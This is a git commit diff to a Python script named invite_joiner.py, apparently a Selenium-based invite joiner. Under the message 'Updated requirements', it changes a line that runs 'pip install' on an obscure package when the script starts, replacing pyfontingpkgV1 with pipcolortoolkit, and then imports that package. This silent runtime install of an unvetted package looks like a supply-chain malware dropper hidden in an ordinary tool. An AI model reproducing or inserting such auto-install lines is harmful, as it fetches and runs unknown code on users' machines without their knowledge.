e55a95fe3f0a0475d7e0f57e29f9db5cf1567fee
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 18:25:10 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontingpkgV1")
-import pyfontingpkgV1
+os.system("pip install pipcolortoolkit")
+import pipcolortoolkit
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
